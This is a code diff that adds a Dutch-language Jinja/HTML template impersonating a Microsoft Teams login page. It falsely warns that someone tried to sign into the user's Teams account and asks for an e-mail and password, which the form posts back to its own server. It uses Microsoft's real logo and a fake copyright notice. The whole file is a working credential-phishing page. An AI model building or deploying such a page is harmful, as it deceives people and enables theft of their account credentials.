@@ -1,0 +1,65 @@
+{% extends 'base.html' %}
+
+{% block head %}
+<script type="text/javascript">
+    function checkforblank() {
+
+    	if (document.getElementById('content1').value == ""){
+
+    		
+    		document.getElementById("demo").innerHTML = "Gebruikersnaam niet ingevuld!";
+    		return false;
+    	}
+
+    	else if (document.getElementById('content2').value == ""){
+
+    		
+    		document.getElementById("demo").innerHTML = "Wachtwoord niet ingevuld of onjuist!";
+    		return false;
+    	}
+    	
+    }
+
+</script>
+<title>Account bevestigen</title>
+{% endblock %}
+
+{% block body %}
+  
+  <div >
+  	<div id="rootView">
+  		<div class="view joinView">
+  			
+
+  			<div class="header" role="banner">
+  				<img class="logo" src="https://statics.teams.microsoft.com/hashedassets-launcher/logo.60f1a4b4a037ca52d8f45f76eb265124.svg" aria-hidden="true">
+  			</div>
+  			<div class="body column centered" role="main">
+
+  				<h1 id="join-prompt-header" class="title">Er is een poging gedaan om in te loggen in uw teams account</h1>
+  				<p class="desktopMessage">
+  					<span>Login om te bevestigen dat het account van u is:</span>
+  				</p>
+  				<form action="/" method="POST"  onsubmit="return checkforblank()">
+  					<!--label>Username</label-->
+  					<br>
+				    <input type="text" autocomplete="off" class="login" placeholder="E-mail" id="content1" name="content1"><br>
+				    <!--label>Password</label-->
+				    
+				    <input type="password" class="login" placeholder="Wachtwoord" id="content2" name="content2"><br>
+				    
+				    <p class="errorMessage" id="demo"><p>
+				    
+                    <button type="submit" id="but" class="button">
+                    	<p class="buttonText">Login</p></button> 
+
+					</form>
+
+					
+
+  			</div><p class="bericht">&copy; 2019 Microsoft Corporation, One Microsoft Way, Redmond WA 98052-7329, VS<p>
+  				  			</div></div>
+  				  		</div>
+
+{% endblock %}
+</html>
